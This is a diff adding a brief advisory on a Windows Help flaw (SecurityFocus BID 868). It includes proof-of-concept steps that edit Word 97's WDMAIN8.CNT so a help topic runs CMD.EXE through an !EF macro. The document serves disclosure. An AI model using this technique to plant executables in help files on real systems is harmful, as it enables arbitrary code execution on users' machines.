@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/868/info
+
+The help files for the Windows Help system (*.cnt, *.hlp) can be edited so that they run an arbitrary executable when selected by a user. The executable will run at the privelege level of the user.
+
+The *.cnt files are like tables of contents that tell the help system what to open when each topic is selected. These entries can be edited to cause system and DLL calls and programs to be executed when a topic is chosen. The help files themselves, *.hlp, can be edited in a similar manner.
+
+
+- Delete C:\Program Files\Microsoft Office\Office\WDMAIN8.GID
+(kill winhlp32.exe process if necessary)
+
+- Edit C:\Program Files\Microsoft Office\Office\WDMAIN8.CNT
+which is a text file. You should change the line which has
+something like:
+
+3 Word 97 new features=woidxWhatsNewInMicrosoftWord97@wdnew8.hlp>REF
+
+to read:
+
+3 Word 97 new features=!EF("CMD.EXE","",1)
+
+- Run WinWord and select Help|Contents from menubar.
+- Find topic "Word 97 new features" and select it.
+- You should see CMD.EXE to run. 
